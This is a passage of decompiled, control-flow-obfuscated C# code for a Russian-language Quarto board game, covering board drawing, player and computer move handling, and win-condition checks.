					}
					else
					{
						num10 = 415912667;
						num11 = 415912667;
					}
					num = num10 ^ ((int)num2 * -518236322);
					continue;
				}
				case 5u:
				{
					int num7;
					if (num6 < 4)
					{
						num = 1589242660;
						num7 = 1589242660;
					}
					else
					{
						num = 1113427379;
						num7 = 1113427379;
					}
					continue;
				}
				case 4u:
					flag = num5 < 4;
					num = 968761267;
					continue;
				case 3u:
					num = ((int)num2 * -1375007715) ^ 0x1BB33A5F;
					continue;
				case 2u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = ((int)num2 * -221695475) ^ 0xFA6405F;
					continue;
				case 1u:
					Paint_Board();
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)(num2 * 1928320757) ^ -548346396;
					continue;
				case 0u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num3 + 0.05f) * (float)size, ((float)num4 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1616044075) ^ -1653209428;
					continue;
				default:
					return;
				case 13u:
					break;
				case 8u:
					return;
					IL_0071:
					flag2 = (byte)num12 != 0;
					num = 994424449;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0fcd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ffb: Expected O, but got Unknown
		int num18 = default(int);
		int num19 = default(int);
		bool flag12 = default(bool);
		int num16 = default(int);
		int num31 = default(int);
		int num32 = default(int);
		int num28 = default(int);
		int num10 = default(int);
		int num20 = default(int);
		Figurine[,] array2 = default(Figurine[,]);
		int num15 = default(int);
		int num7 = default(int);
		int num8 = default(int);
		bool flag15 = default(bool);
		bool flag10 = default(bool);
		Graphics graphics_ = default(Graphics);
		int num3 = default(int);
		int num27 = default(int);
		int num21 = default(int);
		Figurine[,] array3 = default(Figurine[,]);
		bool flag11 = default(bool);
		int num38 = default(int);
		bool flag7 = default(bool);
		bool flag5 = default(bool);
		bool flag13 = default(bool);
		bool flag6 = default(bool);
		int num6 = default(int);
		bool flag14 = default(bool);
		int num9 = default(int);
		int num11 = default(int);
		int num14 = default(int);
		bool flag = default(bool);
		int num12 = default(int);
		bool flag2 = default(bool);
		bool flag8 = default(bool);
		int num13 = default(int);
		bool flag4 = default(bool);
		bool flag9 = default(bool);
		Figurine[,] array = default(Figurine[,]);
		bool flag3 = default(bool);
		while (true)
		{
			int num = 546802252;
			while (true)
			{
				uint num2;
				int num51;
				int num56;
				int num39;
				int num60;
				switch ((num2 = (uint)num ^ 0x6E6C2CE0u) % 179u)
				{
				case 178u:
					Form1.smethod_30((Control)(object)pictureBox[num18, num19]);
					num = ((int)num2 * -504620841) ^ -2092814270;
					continue;
				case 177u:
					num = ((int)num2 * -21012949) ^ -1600767910;
					continue;
				case 176u:
					num = (int)((num2 * 393535482) ^ 0x3F0594B3);
					continue;
				case 175u:
					num = ((int)num2 * -1942690107) ^ 0x16F87446;
					continue;
				case 174u:
				{
					int num47;
					int num48;
					if (!flag12)
					{
						num47 = 1810199571;
						num48 = 1810199571;
					}
					else
					{
						num47 = 508339754;
						num48 = 508339754;
					}
					num = num47 ^ ((int)num2 * -2116094336);
					continue;
				}
				case 173u:
					Form1.smethod_30((Control)(object)pictureBox[num18, num19]);
					num = (int)(num2 * 1287559848) ^ -1743894565;
					continue;
				case 172u:
					num16 = 0;
					num = 410674188;
					continue;
				case 171u:
					num = ((int)num2 * -67079972) ^ 0x535B5293;
					continue;
				case 170u:
					Form1.smethod_15(timer1);
					(menu as Form3).ContinueLock();
					num = (int)(num2 * 371722428) ^ -681267722;
					continue;
				case 169u:
					board[num31, num32] = new Figurine(storage[num18, num19]);
					num = ((int)num2 * -1000738760) ^ 0x5775B9D4;
					continue;
				case 168u:
					Form1.smethod_47(1000);
					num = (int)((num2 * 1360233557) ^ 0x336DEC6D);
					continue;
				case 167u:
					num28++;
					num = (int)((num2 * 2047587939) ^ 0x5D9B2B7);
					continue;
				case 166u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = 71510580;
					continue;
				case 165u:
					num10++;
					num = ((int)num2 * -201761723) ^ -1170395439;
					continue;
				case 164u:
					num = (int)(num2 * 1666191275) ^ -28415608;
					continue;
				case 163u:
					num20++;
					num = ((int)num2 * -1523561415) ^ -795622324;
					continue;
				case 162u:
					array2[num15, num16] = new Figurine(storage[num7, num8]);
					flag15 = Stop(array2);
					num = ((int)num2 * -1570178343) ^ -173775897;
					continue;
				case 161u:
					num = ((int)num2 * -603960607) ^ 0x335A4CAC;
					continue;
				case 160u:
					flag10 = Form1.smethod_41((Control)(object)borderBox[num28, num10]) == Color.Red;
					num = ((int)num2 * -624120379) ^ 0x3A954771;
					continue;
				case 159u:
					num = (int)(num2 * 1518662462) ^ -1677581493;
					continue;
				case 158u:
					if (!Stop(board))
					{
						num = (int)((num2 * 1844628514) ^ 0x4D1E8B98);
						continue;
					}
					goto IL_0288;
				case 157u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num18, num19]), num3 * size + 4, num27 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 641385540) ^ -1701237864;
					continue;
				case 156u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -765440040) ^ 0x5611C355;
					continue;
				case 155u:
				{
					int num53;
					if (!(Form1.smethod_41((Control)(object)borderBox[num20, num21]) == Color.Blue))
					{
						num = 2043922406;
						num53 = 2043922406;
					}
					else
					{
						num = 1155874587;
						num53 = 1155874587;
					}
					continue;
				}
				case 154u:
					num51 = (Standoff(array3) ? 1 : 0);
					goto IL_036e;
				case 153u:
				{
					int num45;
					int num46;
					if (!flag11)
					{
						num45 = -671758226;
						num46 = -671758226;
					}
					else
					{
						num45 = -906414027;
						num46 = -906414027;
					}
					num = num45 ^ ((int)num2 * -2113104363);
					continue;
				}
				case 151u:
				{
					int num42;
					if (num15 < 4)
					{
						num = 1649615032;
						num42 = 1649615032;
					}
					else
					{
						num = 1638644603;
						num42 = 1638644603;
					}
					continue;
				}
				case 150u:
					num = ((int)num2 * -932011990) ^ 0x45CD661;
					continue;
				case 149u:
					num21++;
					num = ((int)num2 * -2007500290) ^ -2000218259;
					continue;
				case 148u:
					Form1.smethod_30((Control)(object)label2);
					num = ((int)num2 * -1800023404) ^ -902148226;
					continue;
				case 147u:
					num38 = 0;
					num = ((int)num2 * -1395575669) ^ -645914618;
					continue;
				case 146u:
					num = ((int)num2 * -2127040979) ^ 0x215F3F25;
					continue;
				case 145u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num3 + 0.05f) * (float)size, ((float)num27 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -516586714) ^ 0xCBC4D64;
					continue;
				case 144u:
				{
					int num33;
					int num34;
					if (!flag7)
					{
						num33 = -260832508;
						num34 = -260832508;
					}
					else
					{
						num33 = -850367297;
						num34 = -850367297;
					}
					num = num33 ^ ((int)num2 * -1627748469);
					continue;
				}
				case 143u:
					flag7 = board[num31, num32] != null;
					num = (int)((num2 * 1401763615) ^ 0x5698316F);
					continue;
				case 142u:
					num = (int)((num2 * 268797969) ^ 0x80FAFE);
					continue;
				case 141u:
					num = (int)(num2 * 124821630) ^ -1893169753;
					continue;
				case 140u:
					flag5 = num27 < 4;
					num = 1978756086;
					continue;
				case 139u:
					num = (int)((num2 * 933379268) ^ 0x64DC1BBA);
					continue;
				case 138u:
				{
					int num24;
					if (num21 < 4)
					{
						num = 855181954;
						num24 = 855181954;
					}
					else
					{
						num = 410385298;
						num24 = 410385298;
					}
					continue;
				}
				case 137u:
					num = 108398123;
					continue;
				case 136u:
					Form1.smethod_30((Control)(object)pictureBox[num20, num21]);
					num = ((int)num2 * -1751140990) ^ -183173491;
					continue;
				case 135u:
					Form1.smethod_20(pictureBox[num18, num19], (Image)null);
					num = ((int)num2 * -1924105952) ^ -2076757;
					continue;
				case 134u:
					num = (int)((num2 * 199156782) ^ 0x252997AB);
					continue;
				case 133u:
					num = ((int)num2 * -1167452870) ^ -1330505402;
					continue;
				case 132u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = ((int)num2 * -1509206928) ^ 0x1F70F3E8;
					continue;
				case 131u:
					num27++;
					num = ((int)num2 * -1011905855) ^ 0x4596EE08;
					continue;
				case 130u:
					flag13 = num3 < 4;
					num = 907665721;
					continue;
				case 129u:
					num = (int)(num2 * 757033018) ^ -1781309701;
					continue;
				case 128u:
					array3[num27, num3] = new Figurine(storage[num18, num19]);
					if (!Stop(array3))
					{
						num = (int)(num2 * 698546392) ^ -1880943494;
						continue;
					}
					num51 = 1;
					goto IL_036e;
				case 127u:
					flag6 = num16 < 4;
					num = 2034638282;
					continue;
				case 126u:
					num = ((int)num2 * -66713721) ^ -1974296384;
					continue;
				case 125u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = ((int)num2 * -179017308) ^ -468209478;
					continue;
				case 124u:
					num = ((int)num2 * -1501270738) ^ 0x83F4A3D;
					continue;
				case 123u:
					num = ((int)num2 * -494312720) ^ -1468483138;
					continue;
				case 122u:
					num = 410933821;
					continue;
				case 121u:
				{
					int num61;
					int num62;
					if (flag15)
					{
						num61 = 1317268128;
						num62 = 1317268128;
					}
					else
					{
						num61 = 2071152491;
						num62 = 2071152491;
					}
					num = num61 ^ (int)(num2 * 1574213157);
					continue;
				}
				case 120u:
					num6++;
					num = ((int)num2 * -193335820) ^ 0x577BC36F;
					continue;
				case 119u:
					if (num8 == num19)
					{
						goto IL_0734;
					}
					goto IL_0740;
				case 118u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1663568991) ^ 0x31067EC3;
					continue;
				case 117u:
				{
					int num58;
					int num59;
					if (flag14)
					{
						num58 = 1165299252;
						num59 = 1165299252;
					}
					else
					{
						num58 = 831508064;
						num59 = 831508064;
					}
					num = num58 ^ ((int)num2 * -353662921);
					continue;
				}
				case 116u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)((num2 * 1010649282) ^ 0x2285C29E);
					continue;
				case 115u:
				{
					int num57;
					if (num9 < 4)
					{
						num = 1925220811;
						num57 = 1925220811;
					}
					else
					{
						num = 1265730456;
						num57 = 1265730456;
					}
					continue;
				}
				case 114u:
					if (!Standoff(board))
					{
						num = 941586068;
						num56 = 941586068;
						continue;
					}
					goto IL_0288;
				case 113u:
					num8 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 26742680) ^ 0x431322C5);
					continue;
				case 112u:
					storage[num18, num19] = null;
					num = ((int)num2 * -1563822817) ^ 0x1C62F741;
					continue;
				case 111u:
					step++;
					num = ((int)num2 * -1634354124) ^ -2007587336;
					continue;
				case 110u:
					num = 936109838;
					continue;
				case 109u:
					num11 = 0;
					num = ((int)num2 * -1153790274) ^ -64174537;
					continue;
				case 108u:
					Paint_Board();
					num = ((int)num2 * -705721892) ^ 0x1354CDAB;
					continue;
				case 107u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num32 + 0.05f) * (float)size, ((float)num31 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -496111292) ^ 0x76C9D7FC;
					continue;
				case 106u:
					Form1.smethod_30((Control)(object)borderBox[num18, num19]);
					num = (int)((num2 * 1324150233) ^ 0x6009462C);
					continue;
				case 105u:
					flag14 = num28 < 4;
					num = 1289276186;
					continue;
				case 104u:
				{
					int num54;
					int num55;
					if (flag13)
					{
						num54 = -1383559954;
						num55 = -1383559954;
					}
					else
					{
						num54 = -994091532;
						num55 = -994091532;
					}
					num = num54 ^ ((int)num2 * -1222914041);
					continue;
				}
				case 103u:
					num = (int)((num2 * 1090528943) ^ 0xE1255E2);
					continue;
				case 102u:
					Form1.smethod_5((Control)(object)borderBox[num18, num19], Color.White);
					num = ((int)num2 * -1885966570) ^ 0x182ACAA8;
					continue;
				case 101u:
				{
					int num52;
					if (num20 >= 4)
					{
						num = 1313234047;
						num52 = 1313234047;
					}
					else
					{
						num = 63209035;
						num52 = 63209035;
					}
					continue;
				}
				case 100u:
					Form1.smethod_5((Control)(object)borderBox[num28, num10], Color.LimeGreen);
					Form1.smethod_30((Control)(object)borderBox[num28, num10]);
					num = ((int)num2 * -836456367) ^ 0x6D021C6F;
					continue;
				case 99u:
					num15++;
					num = (int)(num2 * 1957201940) ^ -995065323;
					continue;
				case 98u:
					num = (int)(num2 * 723010338) ^ -1409800865;
					continue;
				case 97u:
					num14 = num21;
					Form1.smethod_5((Control)(object)borderBox[num20, num21], Color.White);
					num = ((int)num2 * -90410109) ^ 0x582B8A40;
					continue;
				case 96u:
					num = 1062582832;
					continue;
				case 95u:
					num7 = Form1.smethod_33(rnd, 4);
					num = 907955862;
					continue;
				case 94u:
					num = 2033882585;
					continue;
				case 93u:
					num = 824783750;
					continue;
				case 92u:
					num = ((int)num2 * -1441636961) ^ 0x5FE6F469;
					continue;
				case 91u:
					board[num27, num3] = new Figurine(storage[num18, num19]);
					storage[num18, num19] = null;
					flag = Standoff(board);
					num = (int)(num2 * 262828032) ^ -1837991541;
					continue;
				case 90u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)((num2 * 1887217707) ^ 0x6899AD01);
					continue;
				case 89u:
					num = (int)((num2 * 720685600) ^ 0x139B0D9A);
					continue;
				case 88u:
					num11 = num20;
					num12 = num21;
					num = ((int)num2 * -1219888132) ^ 0x675F55EC;
					continue;
				case 87u:
					num = (int)(num2 * 803819758) ^ -2030049686;
					continue;
				case 86u:
				{
					int num49;
					int num50;
					if (flag5)
					{
						num49 = 2068402029;
						num50 = 2068402029;
					}
					else
					{
						num49 = 1753077876;
						num50 = 1753077876;
					}
					num = num49 ^ (int)(num2 * 2078860522);
					continue;
				}
				case 85u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = (int)((num2 * 395322992) ^ 0x8BBA3B2);
					continue;
				case 84u:
					flag11 = num10 < 4;
					num = 1080438989;
					continue;
				case 83u:
					num = ((int)num2 * -1186784507) ^ -678068373;
					continue;
				case 82u:
					num = 1130424794;
					continue;
				case 81u:
					Form1.smethod_5((Control)(object)borderBox[num18, num19], Color.White);
					num = ((int)num2 * -1149178402) ^ 0x1364EC49;
					continue;
				case 80u:
					num16++;
					num = 410674188;
					continue;
				case 79u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = (int)(num2 * 75715353) ^ -418098264;
					continue;
				case 78u:
					num31 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 2081325504) ^ 0x6F9ED261);
					continue;
				case 77u:
					Form1.smethod_30((Control)(object)borderBox[num18, num19]);
					num = (int)(num2 * 281615165) ^ -1709871898;
					continue;
				case 76u:
					num = (int)(num2 * 942568455) ^ -2038484058;
					continue;
				case 75u:
					num21 = 0;
					num = 140183495;
					continue;
				case 74u:
					num = (int)((num2 * 1318406400) ^ 0x7FFD23FF);
					continue;
				case 73u:
					num38++;
					num = ((int)num2 * -1476846788) ^ -1762016633;
					continue;
				case 72u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)(num2 * 1517538413) ^ -1286640279;
					continue;
				case 71u:
					num18 = 0;
					num19 = 0;
					num28 = 0;
					num = (int)(num2 * 58537228) ^ -987125882;
					continue;
				case 70u:
					num = ((int)num2 * -1398297690) ^ 0x68E55CA3;
					continue;
				case 69u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)(num2 * 1275703996) ^ -689365991;
					continue;
				case 68u:
				{
					int num43;
					int num44;
					if (!flag2)
					{
						num43 = -327784454;
						num44 = -327784454;
					}
					else
					{
						num43 = -2142127104;
						num44 = -2142127104;
					}
					num = num43 ^ ((int)num2 * -141593382);
					continue;
				}
				case 67u:
					num = ((int)num2 * -1704025573) ^ -505321201;
					continue;
				case 66u:
					flag8 = true;
					num = (int)((num2 * 1484559258) ^ 0x8C89C6E);
					continue;
				case 65u:
					if (storage[num7, num8] != null)
					{
						num = ((int)num2 * -276734224) ^ -72694139;
						continue;
					}
					goto IL_0734;
				case 64u:
					num27 = 0;
					num = ((int)num2 * -2069767175) ^ -691714329;
					continue;
				case 63u:
				{
					int num40;
					int num41;
					if (flag10)
					{
						num40 = -977880395;
						num41 = -977880395;
					}
					else
					{
						num40 = -1723608733;
						num41 = -1723608733;
					}
					num = num40 ^ (int)(num2 * 365681900);
					continue;
				}
				case 62u:
					storage[num13, num14] = null;
					num = (int)(num2 * 1886069467) ^ -572721148;
					continue;
				case 61u:
					Form1.smethod_7((Control)(object)pictureBox[num6, num9], bool_0: true);
					num = 573688179;
					continue;
				case 60u:
					Form1.smethod_20(pictureBox[num18, num19], (Image)null);
					num = ((int)num2 * -1703909809) ^ -1176596247;
					continue;
				case 59u:
					num = (int)(num2 * 1386783633) ^ -1153935637;
					continue;
				case 58u:
					Form1.smethod_7((Control)(object)pictureBox[num28, num10], bool_0: false);
					num = (int)(num2 * 470179840) ^ -2004491709;
					continue;
				case 57u:
					if (num7 == num18)
					{
						num = ((int)num2 * -421842626) ^ -405062193;
						continue;
					}
					goto IL_0740;
				case 56u:
					num20 = 0;
					num = (int)(num2 * 853769762) ^ -813547306;
					continue;
				case 55u:
					flag4 = num6 < 4;
					num = 126156420;
					continue;
				case 54u:
					Form1.smethod_15(timer1);
					num = 483816797;
					continue;
				case 53u:
					num32 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1370498770) ^ -1863451207;
					continue;
				case 52u:
					num = ((int)num2 * -1969451743) ^ -179120390;
					continue;
				case 51u:
					flag8 = false;
					num = ((int)num2 * -1514205507) ^ 0x41872188;
					continue;
				case 50u:
					if (num38 >= 9)
					{
						num = 1094935387;
						num39 = 1094935387;
						continue;
					}
					goto IL_0f66;
				case 49u:
					num19 = num10;
					num = ((int)num2 * -2034536040) ^ -945261302;
					continue;
				case 48u:
				{
					int num36;
					int num37;
					if (!flag9)
					{
						num36 = -1536149090;
						num37 = -1536149090;
					}
					else
					{
						num36 = -665171549;
						num37 = -665171549;
					}
					num = num36 ^ (int)(num2 * 364093062);
					continue;
				}
				case 47u:
				{
					int num35;
					if (!(Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num21 * size + size / 2, (int)(((float)num20 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0)))
					{
						num = 2031212954;
						num35 = 2031212954;
					}
					else
					{
						num = 247862041;
						num35 = 247862041;
					}
					continue;
				}
				case 46u:
					flag9 = board[num27, num3] == null;
					num = 1439443773;
					continue;
				case 45u:
					num3++;
					num = 281863679;
					continue;
				case 44u:
					num = ((int)num2 * -1697081250) ^ -67232278;
					continue;
				case 43u:
					num = ((int)num2 * -1925565525) ^ 0x2E3DDB40;
					continue;
				case 42u:
					num = (int)(num2 * 2082750197) ^ -368930321;
					continue;
				case 41u:
					num = (int)((num2 * 1492035804) ^ 0x151546AE);
					continue;
				case 40u:
					num14 = 0;
					num = (int)((num2 * 1382597921) ^ 0x54697EB3);
					continue;
				case 39u:
					Form1.smethod_47(200);
					num = ((int)num2 * -730587839) ^ -73726509;
					continue;
				case 38u:
					Form1.smethod_20(pictureBox[num20, num21], (Image)null);
					num = ((int)num2 * -137751543) ^ -1526159838;
					continue;
				case 37u:
					num13 = 0;
					num = ((int)num2 * -444426508) ^ -1195369237;
					continue;
				case 36u:
					num13 = num20;
					num = (int)((num2 * 364263248) ^ 0x3D1DD113);
					continue;
				case 35u:
					if (!flag8)
					{
						num = (int)((num2 * 648697854) ^ 0x2F39F8B6);
						continue;
					}
					goto IL_0f66;
				case 34u:
					num9++;
					num = (int)(num2 * 978497321) ^ -221439515;
					continue;
				case 33u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num18, num19]), num32 * size + 4, num31 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 2008336065) ^ -244393677;
					continue;
				case 32u:
					num18 = num28;
					num = ((int)num2 * -1964005247) ^ -1441253990;
					continue;
				case 31u:
					num = 1559039472;
					continue;
				case 30u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = (int)(num2 * 1477425892) ^ -464256226;
					continue;
				case 29u:
					num = (int)((num2 * 964640578) ^ 0x5402A8BE);
					continue;
				case 28u:
					array[num31, num32] = new Figurine(storage[num18, num19]);
					num15 = 0;
					num = ((int)num2 * -1930085024) ^ 0xBA8282F;
					continue;
				case 27u:
					Form1.smethod_30((Control)(object)borderBox[num20, num21]);
					num = (int)(num2 * 448878133) ^ -1055631323;
					continue;
				case 26u:
					array3 = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -1937653230) ^ -106508013;
					continue;
				case 25u:
				{
					int num29;
					int num30;
					if (!flag6)
					{
						num29 = -1242229913;
						num30 = -1242229913;
					}
					else
					{
						num29 = -2047728481;
						num30 = -2047728481;
					}
					num = num29 ^ (int)(num2 * 263413272);
					continue;
				}
				case 23u:
				{
					int num25;
					int num26;
					if (!flag3)
					{
						num25 = -1634039371;
						num26 = -1634039371;
					}
					else
					{
						num25 = -2064500172;
						num26 = -2064500172;
					}
					num = num25 ^ (int)(num2 * 1448261976);
					continue;
				}
				case 22u:
					num12 = 0;
					num = (int)(num2 * 941616871) ^ -1963934219;
					continue;
				case 21u:
					num = (int)(num2 * 143320645) ^ -707200546;
					continue;
				case 20u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)(num2 * 1582320350) ^ -1853842615;
					continue;
				case 19u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)((num2 * 1120099470) ^ 0x45F30253);
					continue;
				case 18u:
					num = 358472267;
					continue;
				case 17u:
				{
					int num22;
					int num23;
					if (!flag4)
					{
						num22 = -1044106476;
						num23 = -1044106476;
					}
					else
					{
						num22 = -983937413;
						num23 = -983937413;
					}
					num = num22 ^ ((int)num2 * -781091549);
					continue;
				}
				case 16u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -1874279703) ^ 0x3274B18F;
					continue;
				case 15u:
				{
					int num17;
					if (array[num15, num16] == null)
					{
						num = 1581169608;
						num17 = 1581169608;
					}
					else
					{
						num = 936109838;
						num17 = 936109838;
					}
					continue;
				}
				case 14u:
					num = (int)(num2 * 1949623731) ^ -1497912990;
					continue;
				case 13u:
					num = 342183682;
					continue;
				case 12u:
					board[num11, num12] = new Figurine(storage[num13, num14]);
					num = (int)((num2 * 348758461) ^ 0x38FAA060);
					continue;
				case 11u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -1178287876) ^ -1505905833;
					continue;
				case 10u:
					flag3 = Standoff(board);
					num = 944504195;
					continue;
				case 9u:
					num10 = 0;
					num = 1671125824;
					continue;
				case 8u:
					num9 = 0;
					num = 1321156738;
					continue;
				case 7u:
					Form1.smethod_5((Control)(object)borderBox[num7, num8], Color.Blue);
					num = (int)(num2 * 1638843786) ^ -894171900;
					continue;
				case 6u:
					Form1.smethod_30((Control)(object)borderBox[num7, num8]);
					num = (int)(num2 * 1037272815) ^ -450450351;
					continue;
				case 5u:
					flag2 = Form1.smethod_46((Control)(object)pictureBox1);
					num = ((int)num2 * -1881661053) ^ 0x2D375DD6;
					continue;
				case 4u:
					array2 = (Figurine[,])Form1.smethod_48((Array)array);
					num = (int)(num2 * 32548470) ^ -1379609490;
					continue;
				case 3u:
					num6 = 0;
					num = (int)((num2 * 1862482479) ^ 0x69674A40);
					continue;
				case 2u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = 616943206;
						num5 = 616943206;
					}
					else
					{
						num4 = 1608035104;
						num5 = 1608035104;
					}
					num = num4 ^ ((int)num2 * -1611431740);
					continue;
				}
				case 1u:
					num3 = 0;
					num = 778493302;
					continue;
				case 0u:
					num = (int)(num2 * 551465027) ^ -887151130;
					continue;
				default:
					return;
				case 152u:
					break;
				case 24u:
					return;
					IL_0f66:
					num = 1793354718;
					num39 = 1793354718;
					continue;
					IL_036e:
					flag12 = (byte)num51 != 0;
					num = 531413003;
					continue;
					IL_0288:
					num = 1436794711;
					num56 = 1436794711;
					continue;
					IL_0734:
					num = 481627504;
					num60 = 481627504;
					continue;
					IL_0740:
					num = 377403900;
					num60 = 377403900;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		int num3 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		bool flag3 = default(bool);
		bool flag4 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = 1493588700;
			while (true)
			{
				uint num2;
				int num7;
				int num6;
				switch ((num2 = (uint)num ^ 0x99F2CE3u) % 79u)
				{
				case 78u:
					if (mem[num3, 2].Square != mem[num3, 3].Square)
					{
						num = ((int)num2 * -1966571590) ^ 0x76EA86DB;
						continue;
					}
					goto IL_0035;
				case 77u:
					if (mem[3, 0] != null)
					{
						num = ((int)num2 * -14098852) ^ -1327880673;
						continue;
					}
					goto IL_005e;
				case 76u:
				{
					int num64;
					int num65;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num64 = 1840737279;
						num65 = 1840737279;
					}
					else
					{
						num64 = 637100110;
						num65 = 637100110;
					}
					num = num64 ^ (int)(num2 * 1295540193);
					continue;
				}
				case 75u:
				{
					int num48;
					int num49;
					if (mem[num3, 1].Dark != mem[num3, 2].Dark)
					{
						num48 = -273428659;
						num49 = -273428659;
					}
					else
					{
						num48 = -370074985;
						num49 = -370074985;
					}
					num = num48 ^ (int)(num2 * 1487213272);
					continue;
				}
				case 74u:
					num7 = ((mem[2, num3].Square == mem[3, num3].Square) ? 1 : 0);
					goto IL_0036;
				case 73u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = ((int)num2 * -96776940) ^ -281728288;
						continue;
					}
					goto IL_013d;
				case 72u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = (int)((num2 * 814212215) ^ 0x2BECB231);
						continue;
					}
					goto IL_0172;
				case 71u:
				{
					int num55;
					int num56;
					if (mem[1, num3].Big == mem[2, num3].Big)
					{
						num55 = 2123153425;
						num56 = 2123153425;
					}
					else
					{
						num55 = 966687311;
						num56 = 966687311;
					}
					num = num55 ^ (int)(num2 * 187869001);
					continue;
				}
				case 70u:
				{
					int num43;
					int num44;
					if (mem[num3, 1].Big != mem[num3, 2].Big)
					{
						num43 = -292421854;
						num44 = -292421854;
					}
					else
					{
						num43 = -1981611101;
						num44 = -1981611101;
					}
					num = num43 ^ (int)(num2 * 998467002);
					continue;
				}
				case 69u:
					num = ((int)num2 * -1518290537) ^ 0x59BB8857;
					continue;
				case 68u:
				{
					int num22;
					int num23;
					if (mem[1, num3].Dark != mem[2, num3].Dark)
					{
						num22 = -1647411646;
						num23 = -1647411646;
					}
					else
					{
						num22 = -902173420;
						num23 = -902173420;
					}
					num = num22 ^ (int)(num2 * 1843563072);
					continue;
				}
				case 67u:
					if (mem[2, num3].Big != mem[3, num3].Big)
					{
						num = ((int)num2 * -1692270064) ^ 0x15292AE0;
						continue;
					}
					goto IL_027d;
				case 66u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 1788060097;
						continue;
					}
					goto IL_02a9;
				case 65u:
				{
					int num66;
					int num67;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num66 = -1595321570;
						num67 = -1595321570;
					}
					else
					{
						num66 = -417184941;
						num67 = -417184941;
					}
					num = num66 ^ ((int)num2 * -270072019);
					continue;
				}
				case 64u:
				{
					int num57;
					if (mem[num3, 0].Square == mem[num3, 1].Square)
					{
						num = 406599011;
						num57 = 406599011;
					}
					else
					{
						num = 609860293;
						num57 = 609860293;
					}
					continue;
				}
				case 63u:
					if (mem[2, num3].Point != mem[3, num3].Point)
					{
						num = (int)(num2 * 1474793148) ^ -967098941;
						continue;
					}
					goto IL_027d;
				case 62u:
				{
					int num52;
					if (mem[num3, 0].Dark == mem[num3, 1].Dark)
					{
						num = 449701067;
						num52 = 449701067;
					}
					else
					{
						num = 234913421;
						num52 = 234913421;
					}
					continue;
				}
				case 61u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = (int)((num2 * 88878139) ^ 0xBB33370);
						continue;
					}
					goto IL_013d;
				case 60u:
				{
					int num33;
					int num34;
					if (mem[1, 1].Square != mem[2, 2].Square)
					{
						num33 = -1200512939;
						num34 = -1200512939;
					}
					else
					{
						num33 = -2072741189;
						num34 = -2072741189;
					}
					num = num33 ^ (int)(num2 * 799996872);
					continue;
				}
				case 59u:
					if (mem[0, num3].Square == mem[1, num3].Square)
					{
						num = 591191348;
						continue;
					}
					goto IL_042b;
				case 58u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = ((int)num2 * -945798204) ^ -1582213231;
						continue;
					}
					goto IL_0172;
				case 57u:
					flag2 = true;
					num = (int)(num2 * 914615222) ^ -240371767;
					continue;
				case 56u:
				{
					int num17;
					int num18;
					if (flag)
					{
						num17 = 931446816;
						num18 = 931446816;
					}
					else
					{
						num17 = 1094161440;
						num18 = 1094161440;
					}
					num = num17 ^ ((int)num2 * -1816530501);
					continue;
				}
				case 55u:
					num3 = 0;
					num = (int)(num2 * 404426067) ^ -1520875668;
					continue;
				case 54u:
					num = 1074458044;
					continue;
